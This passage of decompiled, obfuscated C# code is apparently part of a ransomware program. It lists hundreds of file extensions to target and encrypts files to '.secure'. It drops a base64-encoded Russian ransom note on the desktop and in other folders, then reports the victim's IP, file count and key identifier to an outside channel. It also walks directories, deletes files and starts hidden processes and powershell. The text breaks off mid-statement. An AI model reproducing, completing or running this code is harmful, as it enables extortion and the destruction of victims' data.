          "wsp",
          "wspak",
          "wtb",
          "wtbn",
          "wtd",
          "wtf",
          "wtml",
          "wtmp",
          "wtp",
          "wtr",
          "wts",
          "wtt",
          "wtx",
          "wud",
          "wvp",
          "wvw",
          "wvx",
          "wwcx",
          "WWD",
          "wwi",
          "wwl",
          "wws",
          "wwt",
          "wx",
          "wxmx",
          "wxp",
          "wyn",
          "wzn",
          "wzs",
          "x11",
          "x16",
          "x3f",
          "x3g",
          "x64",
          "xa",
          "xaf",
          "xaiml",
          "XAML",
          "xamlx",
          "xappl",
          "xar",
          "xas",
          "xav",
          "xbc",
          "xbd",
          "XBF",
          "xbk",
          "xbrl",
          "xbt",
          "xci",
          "xcsl",
          "xda",
          "xdb",
          "xdc",
          "xdf",
          "xdi",
          "xdna",
          "xdo",
          "xdoc",
          "xdp",
          "xds",
          "xdw",
          "xef",
          "xem",
          "xer",
          "xf",
          "xfd",
          "xfdf",
          "xfi",
          "xfl",
          "xflow",
          "xfn",
          "xfo",
          "xfp",
          "xfr",
          "xft",
          "xfx",
          "xgml",
          "xgmml",
          "xgp",
          "xht",
          "xhtm",
          "xhtml",
          "xif",
          "xig",
          "XIN",
          "xis",
          "xjf",
          "xl",
          "xla",
          "xlam",
          "xlb",
          "xlc",
          "xld",
          "xle",
          "xlf",
          "xlgc",
          "xliff",
          "xline",
          "xlist",
          "xlk",
          "xll",
          "xlm",
          "xlnk",
          "xlr",
          "xls",
          "xlsb",
          "xlse",
          "xlshtml",
          "xlsl",
          "xlsm",
          "xlst",
          "xlsx",
          "xlsxl",
          "xlt",
          "xlthtml",
          "xltm",
          "xltx",
          "xlv",
          "xlw",
          "xlwx",
          "xma",
          "xmap",
          "xmcd",
          "xmct",
          "xmd",
          "xmdf",
          "xmf",
          "xmi",
          "xmind",
          "xml",
          "xmlff",
          "xmlper",
          "xmmap",
          "xmn",
          "xmp",
          "xmpz",
          "xms",
          "xmt_bin",
          "xmta",
          "xmwx",
          "xmzx",
          "XPB",
          "xpd",
          "xpdl",
          "xpg",
          "xpi",
          "xpj",
          "xpll",
          "xpm",
          "xpr",
          "xps",
          "xpse",
          "xpt",
          "xpwe",
          "xqm",
          "xqr",
          "xqx",
          "xrb",
          "xrdml",
          "xrff",
          "xrp",
          "xry",
          "xsc",
          "xsd",
          "xsf",
          "xsig",
          "xsl",
          "xslt",
          "xsvf",
          "XSX",
          "xtbl",
          "xtd",
          "xtg",
          "xtm",
          "xtml",
          "xtp",
          "xtps",
          "xtrl",
          "xum",
          "xv0",
          "xv2",
          "xv3",
          "xva",
          "xvct",
          "xvd",
          "xvg",
          "xvid",
          "xvl",
          "xwd",
          "xweb3htm",
          "xweb3html",
          "xweb4stm",
          "xweb4xml",
          "xwf",
          "xwp",
          "xxd",
          "xxe",
          "xxx",
          "xy",
          "xy3",
          "xy4v",
          "xyd",
          "xyz",
          "xyzv",
          "yab",
          "yam",
          "ycbcra",
          "ychat",
          "yenc",
          "YES",
          "ygf",
          "yka",
          "yml",
          "ync",
          "yps",
          "yrcbck",
          "yrcbkm",
          "yrcdat",
          "yumtx",
          "yuv",
          "z02",
          "z04",
          "zap",
          "zbfx",
          "zdb",
          "zdc",
          "zdct",
          "ZFSENDTOTARGET",
          "zim",
          "zip",
          "zipx",
          "zix",
          "zma",
          "zmc",
          "zoo",
          "zpl",
          "zps",
          "ztmp",
          "ert",
          "efd",
          "biz",
          "CDX",
          "SQL",
          "DD",
          "MD",
          "MDF",
          "LOG",
          "DB",
          "BD",
          "LOG",
          "cfu",
          "DAT",
          "DBF",
          "DBX",
          "SDF",
          "BACK",
          "BACKUP",
          "BAC",
          "AWB",
          "DMP",
          "SAV",
          "TIB",
          "VBK",
          "VRB",
          "WBB",
          "TRN",
          "TIS",
          "ZIP",
          "RAR",
          "SQL",
          "BAK",
          "DCX",
          "DBC",
          "DBX",
          "DCT",
          "XLS",
          "XLSX",
          "DOC",
          "DOCX",
          "FPT",
          "LDF",
          "NDF",
          "$ER",
          "4DD",
          "4DL",
          "ACCDB",
          "ACCDC",
          "ACCDE",
          "ACCDR",
          "ACCDT",
          "ACCFT",
          "ADB",
          "ADB",
          "ADE",
          "ADF",
          "ADP",
          "ALF",
          "ASK",
          "BTR",
          "CAT",
          "CDB",
          "CDB",
          "CDB",
          "CKP",
          "CMA",
          "CPD",
          "CRYPT12",
          "CRYPT8",
          "CRYPT9",
          "DACPAC",
          "DAD",
          "DADIAGRAMS",
          "DASCHEMA",
          "DB",
          "DB",
          "DB-SHM",
          "DB-WAL",
          "DBCRYPT12",
          "DBCRYPT8",
          "DB3",
          "DBC",
          "DBF",
          "DBS",
          "DBT",
          "DBV",
          "DBX",
          "DCB",
          "DCT",
          "DCX",
          "DDL",
          "DLIS",
          "DP1",
          "DQY",
          "DSK",
          "DSN",
          "DTSX",
          "DXL",
          "ECO",
          "ECX",
          "EDB",
          "EDB",
          "EPIM",
          "EXB",
          "FCD",
          "FDB",
          "FDB",
          "FIC",
          "FMP",
          "FMP12",
          "FMPSL",
          "FOL",
          "FP3",
          "FP4",
          "FP5",
          "FP7",
          "FPT",
          "FRM",
          "GDB",
          "GDB",
          "GRDB",
          "GWI",
          "HDB",
          "HIS",
          "IB",
          "IDB",
          "IHX",
          "ITDB",
          "ITW",
          "JET",
          "JTX",
          "KDB",
          "KEXI",
          "KEXIC",
          "KEXIS",
          "LGC",
          "LWX",
          "MAF",
          "MAQ",
          "MAR",
          "MARSHAL",
          "MAS",
          "MAV",
          "MDB",
          "MDF",
          "MPD",
          "MRG",
          "MUD",
          "MWB",
          "MYD",
          "NDF",
          "NNT",
          "NRMLIB",
          "NS2",
          "NS3",
          "NS4",
          "NSF",
          "NV",
          "NV2",
          "NWDB",
          "NYF",
          "ODB",
          "ODB",
          "OQY",
          "ORA",
          "ORX",
          "OWC",
          "P96",
          "P97",
          "PAN",
          "PDB",
          "PDB",
          "PDM",
          "PNZ",
          "QRY",
          "QVD",
          "RBF",
          "RCTD",
          "ROD",
          "ROD",
          "RODX",
          "RPD",
          "RSD",
          "SAS7BDAT",
          "SBF",
          "SCX",
          "SDB",
          "SDB",
          "SDB",
          "SDB",
          "SDC",
          "SDF",
          "SIS",
          "SPQ",
          "SQL",
          "SQLITE",
          "SQLITE3",
          "SQLITEDB",
          "TE",
          "TEACHER",
          "TEMX",
          "TMD",
          "TPS",
          "TRC",
          "TRC",
          "TRM",
          "UDB",
          "UDL",
          "USR",
          "V12",
          "VIS",
          "VPD",
          "VVV",
          "WDB",
          "WMDB",
          "WRK",
          "XDB",
          "XLD",
          "XMLFF"
        }, new string[0], BErRpdYOfQAwSr.DhkyAUdEoqAPuutg(secureString), ".secure");
      }
      catch (Exception ex3)
      {
        if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
        {
          try
          {
            System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "Finish process: " + ex3.Message);
          }
          catch (Exception ex4)
          {
          }
        }
        try
        {
          secureString.Dispose();
        }
        catch
        {
        }
      }
      try
      {
        secureString.Dispose();
      }
      catch
      {
      }
      try
      {
        if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
        {
          using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
          {
            streamWriter.WriteLine(BErRpdYOfQAwSr.oMKRHTBqYRfOk("0JLQsNGI0Lgg0LTQvtC60YPQvNC10L3RgtGLLCDQsdCw0LfRiyDQtNCw0L3QvdGL0YUg0Lgg0LTRgNGD0LPQuNC1INGE0LDQudC70Ysg0LHRi9C70Lgg0LfQsNGI0LjRhNGA0L7QstCw0L3Riy4g0J3QviDQvdC1INGB0YLQvtC40YIg0L/QtdGA0LXQttC40LLQsNGC0YwhIA0K0JzRiyDQstGB0LUg0YDQsNGB0YjQuNGE0YDRg9C10Lwg0Lgg0LLQtdGA0L3QtdC8INC90LAg0YHQstC+0Lgg0LzQtdGB0YLQsC4NCg0K0JTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFOg0KDQrQndCw0L/QuNGI0LjRgtC1INC90LAg0L/QvtGH0YLRgyAtIHNlY3VyaXR5ODQ5QG51a2UuYWZyaWNhDQogDQogKtCSINC/0LjRgdGM0LzQtSDRg9C60LDQt9Cw0YLRjCDQktCw0Ygg0LvQuNGH0L3Ri9C5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGAIChLZXkgSWRlbnRpZmllcikNCiAq0J/RgNC40LrRgNC10L/QuNGC0LUgMiDRhNCw0LnQu9CwINC00L4gMiDQvNCxINC00LvRjyDRgtC10YHRgtC+0LLQvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60LguIA0KICDQvNGLINC40YUg0YDQsNGB0YjQuNGE0YDRg9C10LwsINCyINC60LDRh9C10YHRgtCy0LUg0LTQvtC60LDQt9Cw0YLQtdC70YzRgdGC0LLQsCwg0YfRgtC+INCi0J7Qm9Cs0JrQniDQnNCrINC80L7QttC10Lwg0YDQsNGB0YjQuNGE0YDQvtCy0LDRgtGMINGE0LDQudC70YsuDQoNCtCS0JDQltCd0J4hINCd0LUg0L/QuNGI0LjRgtC1INGBIG1haWwucnUgKNC6INC90LDQvCDQvdC1INC00L7RhdC+0LTRj9GCINC/0LjRjNGB0LzQsCkg0JjRgdC/0L7Qu9GM0LfRg9C50YLQtSAtIHlhbmRleC5ydSBnbWFpbC5jb20g0Lgg0YIu0LQuIA0K0JLRgdC1INC60YDQvtC80LUgbWFpbC5ydQ0KDQogLdCn0LXQvCDQsdGL0YHRgtGA0LXQtSDQstGLINGB0L7QvtCx0YnQuNGC0LUg0L3QsNC8INGB0LLQvtC5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGALCDRgtC10Lwg0LHRi9GB0YLRgNC10LUg0LzRiyDQstGL0LrQu9GO0YfQuNC8INC/0YDQvtC40LfQstC+0LvRjNC90L7QtSDRg9C00LDQu9C10L3QuNC1INGE0LDQudC70L7Qsi4NCiAt0J3QsNC/0LjRgdCw0LIg0L3QsNC8INC90LAg0L/QvtGH0YLRgyDQstGLINC/0L7Qu9GD0YfQuNGC0LUg0LTQsNC70YzQvdC10LnRiNC40LUg0LjQvdGB0YLRgNGD0LrRhtC40Lgg0L/QviDQvtC/0LvQsNGC0LUuDQoNCtCSINC+0YLQstC10YLQvdC+0Lwg0L/QuNGB0YzQvNC1INCS0Ysg0L/QvtC70YPRh9C40YLQtSDQv9GA0L7Qs9GA0LDQvNC80YMg0LTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60LguDQrQn9C+0YHQu9C1INC30LDQv9GD0YHQutCwINC/0YDQvtCz0YDQsNC80LzRiy3QtNC10YjQuNGE0YDQvtCy0YnQuNC60LAg0LLRgdC1INCS0LDRiNC4INGE0LDQudC70Ysg0LHRg9C00YPRgiDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3Riy4NCg0K0JzRiyDQs9Cw0YDQsNC90YLQuNGA0YPQtdC8Og0KMTAwJSDRg9GB0L/QtdGI0L3QvtC1INCy0L7RgdGB0YLQsNC90L7QstC70LXQvdC40LUg0LLRgdC10YUg0LLQsNGI0LjRhSDRhNCw0LnQu9C+0LINCjEwMCUg0LPQsNGA0LDQvdGC0LjRjiDRgdC+0L7RgtCy0LXRgtGB0YLQstC40Y8NCjEwMCUg0LHQtdC30L7Qv9Cw0YHQvdGL0Lkg0Lgg0L3QsNC00LXQttC90YvQuSDRgdC10YDQstC40YENCtCS0L3QuNC80LDQvdC40LUhDQogKiDQndC1INC/0YvRgtCw0LnRgtC10YHRjCDRg9C00LDQu9C40YLRjCDQv9GA0L7Qs9GA0LDQvNC80YMg0LjQu9C4INC30LDQv9GD0YHQutCw0YLRjCDQsNC90YLQuNCy0LjRgNGD0YHQvdGL0LUg0YHRgNC10LTRgdGC0LLQsA0KICog0J/QvtC/0YvRgtC60Lgg0YHQsNC80L7RgdGC0L7Rj9GC0LXQu9GM0L3QvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0YTQsNC50LvQvtCyINC/0YDQuNCy0LXQtNGD0YIg0Log0L/QvtGC0LXRgNC1INCS0LDRiNC40YUg0LTQsNC90L3Ri9GFDQogKiDQlNC10YjQuNGE0YDQsNGC0L7RgNGLINC00YDRg9Cz0LjRhSDQv9C+0LvRjNC30L7QstCw0YLQtdC70LXQuSDQvdC10YHQvtCy0LzQtdGB0YLQuNC80Ysg0YEg0JLQsNGI0LjQvNC4INC00LDQvdC90YvQvNC4LCDRgtCw0Log0LrQsNC6INGDINC60LDQttC00L7Qs9C+INC/0L7Qu9GM0LfQvtCy0LDRgtC10LvRjw0K0YPQvdC40LrQsNC70YzQvdGL0Lkg0LrQu9GO0Ycg0YjQuNGE0YDQvtCy0LDQvdC40Y8NCg0KDQrQmtCw0LbQtNGL0LUgMjQg0YfQsNGB0LAg0YPQtNCw0LvRj9GO0YLRgdGPIDI0INGE0LDQudC70LAsINC90LXQvtCx0YXQvtC00LjQvNC+INC/0YDQuNGB0LvQsNGC0Ywg0YHQstC+0Lkg0LjQtNC10L3RgtC40YTQuNC60LDRgtC+0YAg0YfRgtC+0LEg0LzRiyDQvtGC0LrQu9GO0YfQuNC70Lgg0Y3RgtGDINGE0YPQvdC60YbQuNGOLg0K0JrQsNC20LTRi9C1IDI0INGH0LDRgdCwINGB0YLQvtC40LzQvtGB0YLRjCDRgNCw0YHRiNC40YTRgNC+0LLQutC4INC00LDQvdC90YvRhSDRg9Cy0LXQu9C40YfQuNCy0LDQtdGC0YHRjyDQvdCwIDMwJSAo0YfQtdGA0LXQtyA3MiDRh9Cw0YHQsCDRgdGD0LzQvNCwINGE0LjQutGB0LjRgNGD0LXRgtGB0Y8pDQoNCg0KUC5TDQrQldGB0LvQuCDQktCw0Lwg0L3QtSDQvtGC0LLQtdGC0LjQu9C4INCyINGC0LXRh9C10L3QuNC4IDQ4INGH0LDRgdC+0LIuINCS0LDQvCDQvdGD0LbQvdC+INCx0YPQtNC10YIg0YHQstGP0LfQsNGC0YzRgdGPINGBINC90LDQvNC4INC/0L4g0LTQvtC/0L7Qu9C90LjRgtC10LvRjNC90YvQvCDQutC+0L3RgtCw0LrRgtCw0LwuIA0KDQrQodC60LDRh9Cw0LnRgtC1INC4INGD0YHRgtCw0L3QvtCy0LjRgtC1IFRvciBCcm93c2VyIC0gaHR0cHM6Ly93d3cudG9ycHJvamVjdC5vcmcvcnUvZG93bmxvYWQvDQrQntGC0LrRgNC+0LnRgtC1INGH0LXRgNC10LcgVG9yIEJyb3dzZXIg0YHQsNC50YIgLSBodHRwOi8vc29uYXJtc25pa28ybHZmdS5vbmlvbiAgICjRgdCw0LnRgiDQvdC1INCx0YPQtNC10YIg0YDQsNCx0L7RgtCw0YLRjCDRh9C10YDQtdC3INC+0LHRi9GH0L3Ri9C5INCx0YDQsNGD0LfQtdGALCDRgtC+0LvRjNC60L4g0YfQtdGA0LXQtyDQotCe0KApDQrQl9Cw0YDQtdCz0LjRgdGC0YDQuNGA0YPQudGC0LXRgdGMINC4INC90LDQv9C40YjQuNGC0LUg0L3QsNC8LiANCg0KKtCd0LDRiCDQvdC40Log0LIgU29uYXInZSAtIHNhdmVmaWxlMzY1"));
            streamWriter.WriteLine("\r\n");
            streamWriter.WriteLine(BErRpdYOfQAwSr.oMKRHTBqYRfOk("S2V5IElkZW50aWZpZXI6IA=="));
            streamWriter.WriteLine(BErRpdYOfQAwSr.nFHjUKNuaEOj);
            if (BErRpdYOfQAwSr.dQHMXFnCEYNSw == "NO")
            {
              streamWriter.WriteLine("\r\n");
              streamWriter.WriteLine(BErRpdYOfQAwSr.oMKRHTBqYRfOk("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(BErRpdYOfQAwSr.TZzJBVGXhjZB.Count));
            }
          }
        }
        else
          System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt", "\r\nAditional KeyId:\r\n" + BErRpdYOfQAwSr.nFHjUKNuaEOj);
      }
      catch
      {
      }
      int num2 = 0;
      foreach (string str in BErRpdYOfQAwSr.igfzwruhwWDXY)
      {
        ++num2;
        try
        {
          if (str == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
            continue;
        }
        catch
        {
        }
        try
        {
          if (!System.IO.File.Exists(str + "\\Инструкция.txt"))
            System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt", str + "\\Инструкция.txt", true);
          else
            System.IO.File.AppendAllText(str + "\\Инструкция.txt", "\r\nAditional KeyId:\r\n" + BErRpdYOfQAwSr.nFHjUKNuaEOj);
        }
        catch (Exception ex)
        {
        }
        if (!BErRpdYOfQAwSr.SQFadnwkoNIbWf)
        {
          if (num2 > 10)
            break;
        }
      }
      if (BErRpdYOfQAwSr.HbxHJoiXAuWQ == "YES")
      {
        try
        {
          if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta"))
          {
            using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta"))
            {
              streamWriter.WriteLine(BErRpdYOfQAwSr.oMKRHTBqYRfOk("MESSAGERICH"));
              streamWriter.WriteLine("\r\n");
              streamWriter.WriteLine(BErRpdYOfQAwSr.oMKRHTBqYRfOk("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
              streamWriter.WriteLine(BErRpdYOfQAwSr.nFHjUKNuaEOj + BErRpdYOfQAwSr.oMKRHTBqYRfOk("PC9wPg=="));
              if (BErRpdYOfQAwSr.dQHMXFnCEYNSw == "NO")
              {
                streamWriter.WriteLine("\r\n");
                streamWriter.WriteLine(BErRpdYOfQAwSr.oMKRHTBqYRfOk("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + BErRpdYOfQAwSr.oMKRHTBqYRfOk("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(BErRpdYOfQAwSr.TZzJBVGXhjZB.Count) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("PC9wPg=="));
              }
            }
          }
          else
            System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta", BErRpdYOfQAwSr.oMKRHTBqYRfOk("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAditional KeyId:\r\n" + BErRpdYOfQAwSr.nFHjUKNuaEOj + BErRpdYOfQAwSr.oMKRHTBqYRfOk("PC9wPg=="));
        }
        catch
        {
        }
      }
      if (BErRpdYOfQAwSr.jwPpkVDbeOk == "YES")
      {
        try
        {
          if (BErRpdYOfQAwSr.dQHMXFnCEYNSw == "NO")
            BhEjWEybWo.ZoswELULsecbGti(YyEawpjnVWJ: (BErRpdYOfQAwSr.oMKRHTBqYRfOk("Q2xpZW50IElQOiA=") + new WebClient().DownloadString(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aHR0cDovL2ljYW5oYXppcC5jb20=")) + "\r" + BErRpdYOfQAwSr.oMKRHTBqYRfOk("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + (object) DateTime.Now + "\r\n" + BErRpdYOfQAwSr.oMKRHTBqYRfOk("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + Convert.ToString(BErRpdYOfQAwSr.TZzJBVGXhjZB.Count) + "\r\n" + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + BErRpdYOfQAwSr.nFHjUKNuaEOj));
          else
            BhEjWEybWo.ZoswELULsecbGti(YyEawpjnVWJ: (BErRpdYOfQAwSr.oMKRHTBqYRfOk("Q2xpZW50IElQOiA=") + new WebClient().DownloadString(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aHR0cDovL2ljYW5oYXppcC5jb20=")) + "\r" + BErRpdYOfQAwSr.oMKRHTBqYRfOk("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + (object) DateTime.Now + "\r\n" + BErRpdYOfQAwSr.oMKRHTBqYRfOk("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + Convert.ToString(BErRpdYOfQAwSr.TZzJBVGXhjZB.Count) + "\r\n" + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + BErRpdYOfQAwSr.nFHjUKNuaEOj));
        }
        catch
        {
        }
      }
      if (BErRpdYOfQAwSr.mEzYTStgRnr == "YES")
      {
        try
        {
          CNinoMfdeOhB.vrHxdYhUAdLlHj(new Uri(""));
        }
        catch
        {
        }
      }
      if (BErRpdYOfQAwSr.HbxHJoiXAuWQ == "NO")
      {
        try
        {
          if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
            Process.Start(BErRpdYOfQAwSr.oMKRHTBqYRfOk("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt");
        }
        catch
        {
        }
      }
      else
      {
        try
        {
          if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta"))
            Process.Start(BErRpdYOfQAwSr.oMKRHTBqYRfOk("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.hta");
        }
        catch
        {
        }
      }
      if (BErRpdYOfQAwSr.ILHnWjQjfUkffJe == "YES")
      {
        if (BErRpdYOfQAwSr.EMkDRelwWGZ == "YES" && !string.IsNullOrEmpty(BErRpdYOfQAwSr.EhKqkDBbta) && !string.IsNullOrEmpty(BErRpdYOfQAwSr.hXdhfhCZQZwsD))
          BErRpdYOfQAwSr.avpYLdZBuA(BErRpdYOfQAwSr.EhKqkDBbta, BErRpdYOfQAwSr.hXdhfhCZQZwsD);
        else
          BErRpdYOfQAwSr.avpYLdZBuA();
      }
      if (BErRpdYOfQAwSr.fFemGrmzsojBt != "LOGONISOFF")
        BErRpdYOfQAwSr.dMZRilCNEznH(BErRpdYOfQAwSr.fFemGrmzsojBt);
      if (!string.IsNullOrEmpty(BErRpdYOfQAwSr.PKLvCQuQNcTS))
      {
        try
        {
          System.IO.File.Delete(BErRpdYOfQAwSr.PKLvCQuQNcTS);
        }
        catch
        {
        }
      }
      if (BErRpdYOfQAwSr.qXKhyFzEohGXJJ)
      {
        try
        {
          if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"))
            ZSRzlUascz.NbgTuKOJrMYz(System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Инструкция.txt"));
        }
        catch
        {
        }
      }
      if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
      {
        try
        {
          System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "All Done!");
        }
        catch (Exception ex)
        {
        }
      }
      if (!(BErRpdYOfQAwSr.plsJGHfMIwqB == "EVET"))
        return;
      BErRpdYOfQAwSr.PNdHksrWsNzLSUd();
    }

    public static void bzrTFBJEroUqd()
    {
      int num = (int) MessageBox.Show(BErRpdYOfQAwSr.oMKRHTBqYRfOk("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), BErRpdYOfQAwSr.oMKRHTBqYRfOk("QXRlbnRpb24h"), MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    private static int odeHSPcZur([In] int obj0, [In] int obj1)
    {
      RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider();
      byte[] data = new byte[4];
      cryptoServiceProvider.GetBytes(data);
      return new Random(BitConverter.ToInt32(data, 0)).Next(obj0, obj1);
    }

    public static List<string> jxPpLMoTLhR(
      [In] string obj0,
      [In] string[] obj1,
      [In] string obj2,
      [In] string[] obj3,
      [In] string obj4)
    {
      List<string> stringList = new List<string>();
      Stack<string> stringStack = new Stack<string>(20);
      stringStack.Push(obj0);
      while (stringStack.Count > 0)
      {
        string path = stringStack.Pop();
        string[] directories;
        try
        {
          directories = Directory.GetDirectories(path);
        }
        catch
        {
          continue;
        }
        string[] files;
        try
        {
          if (!path.ToLower().Contains(":\\program files\\"))
          {
            if (!path.ToLower().Contains(":\\windows\\"))
            {
              if (!path.ToLower().Contains("perflogs"))
              {
                if (!path.ToLower().Contains("internet explorer"))
                {
                  if (!path.ToLower().Contains(":\\programdata\\"))
                  {
                    if (!path.ToLower().Contains("appdata"))
                    {
                      if (!path.ToLower().Contains("msocache"))
                      {
                        if (!path.ToLower().Contains("system volume information"))
                        {
                          if (!path.ToLower().Contains("boot"))
                          {
                            if (!path.ToLower().Contains("tor browser"))
                            {
                              if (!path.ToLower().Contains("mozilla"))
                              {
                                if (!path.ToLower().Contains("appdata"))
                                {
                                  if (!path.ToLower().Contains("google chrome"))
                                  {
                                    if (!path.ToLower().Contains("application data"))
                                      files = Directory.GetFiles(path);
                                    else
                                      continue;
                                  }
                                  else
                                    continue;
                                }
                                else
                                  continue;
                              }
                              else
                                continue;
                            }
                            else
                              continue;
                          }
                          else
                            continue;
                        }
                        else
                          continue;
                      }
                      else
                        continue;
                    }
                    else
                      continue;
                  }
                  else
                    continue;
                }
                else
                  continue;
              }
              else
                continue;
            }
            else
              continue;
          }
          else
            continue;
        }
        catch
        {
          continue;
        }
        foreach (string fileName in files)
        {
          try
          {
            FileInfo fileInfo = new FileInfo(fileName);
            if (!fileInfo.FullName.Contains("autoexec.bat"))
            {
              if (!fileInfo.FullName.Contains("desktop.ini"))
              {
                if (!fileInfo.FullName.Contains("autorun.inf"))
                {
                  if (!fileInfo.FullName.Contains("ntuser.dat"))
                  {
                    if (!fileInfo.FullName.Contains("NTUSER.DAT"))
                    {
                      if (!fileInfo.FullName.Contains("iconcache.db"))
                      {
                        if (!fileInfo.FullName.Contains("bootsect.bak"))
                        {
                          if (!fileInfo.FullName.Contains("boot.ini"))
                          {
                            if (!fileInfo.FullName.Contains("ntuser.dat.log"))
                            {
                              if (!fileInfo.FullName.Contains("thumbs.db"))
                              {
                                if (!fileInfo.FullName.ToLower().Contains("bootmgr"))
                                {
                                  if (!fileInfo.FullName.ToLower().Contains("pagefile.sys"))
                                  {
                                    if (!fileInfo.FullName.ToLower().Contains("config.sys"))
                                    {
                                      if (!fileInfo.FullName.ToLower().Contains("ntuser.ini"))
                                      {
                                        if (!fileInfo.FullName.Contains(BErRpdYOfQAwSr.oMKRHTBqYRfOk("QnVpbGRlcl9Mb2c=")))
                                        {
                                          if (!fileInfo.FullName.Contains("RSAKeys"))
                                          {
                                            if (!fileInfo.FullName.Contains("Инструкция"))
                                            {
                                              if (!fileInfo.FullName.EndsWith(".secure"))
                                              {
                                                if (!fileInfo.FullName.EndsWith("exe"))
                                                {
                                                  if (!fileInfo.FullName.EndsWith("dll"))
                                                  {
                                                    if (!fileInfo.FullName.EndsWith("EXE"))
                                                    {
                                                      if (!fileInfo.FullName.EndsWith("DLL"))
                                                      {
                                                        if (!fileInfo.FullName.Contains("Recycle.Bin"))
                                                        {
                                                          if (!fileInfo.FullName.Contains(BErRpdYOfQAwSr.SGHDaCxgQr))
                                                          {
                                                            if (!fileInfo.FullName.Contains(BErRpdYOfQAwSr.OpWBXzCwVRYsxq))
                                                            {
                                                              if (!fileInfo.FullName.Contains(BErRpdYOfQAwSr.MwUDomDUGsVhYA))
                                                              {
                                                                if (System.IO.File.Exists(fileInfo.FullName) && (double) fileInfo.Length <= double.Parse(BErRpdYOfQAwSr.FIbXXLCVARq) * 1024.0 * 1024.0 && BErRpdYOfQAwSr.ZrRHitKveMxniC == "YES")
                                                                {
                                                                  stringList.Add(fileInfo.FullName);
                                                                  BErRpdYOfQAwSr.vDTDGwOisXmcJ(stringList, obj1, obj2, obj3, obj4);
                                                                  stringList.Clear();
                                                                }
                                                                else if (System.IO.File.Exists(fileInfo.FullName))
                                                                {
                                                                  if (BErRpdYOfQAwSr.ZrRHitKveMxniC == "NO")
                                                                  {
                                                                    stringList.Add(fileInfo.FullName);
                                                                    BErRpdYOfQAwSr.vDTDGwOisXmcJ(stringList, obj1, obj2, obj3, obj4);
                                                                    stringList.Clear();
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
          catch
          {
          }
        }
        foreach (string str in directories)
          stringStack.Push(str);
      }
      return stringList;
    }

    public static string uATAppcKlZ(string XMYfRqQvHEQq = "", string eegtHWxTJETuDh = "")
    {
      string str = "";
      try
      {
        new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            FileName = XMYfRqQvHEQq,
            Arguments = eegtHWxTJETuDh,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            StandardOutputEncoding = Encoding.GetEncoding(850)
          }
        }.Start();
      }
      catch
      {
      }
      return str;
    }

    public static void ICvwPzGGqyQhqi([In] string obj0) => new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell",
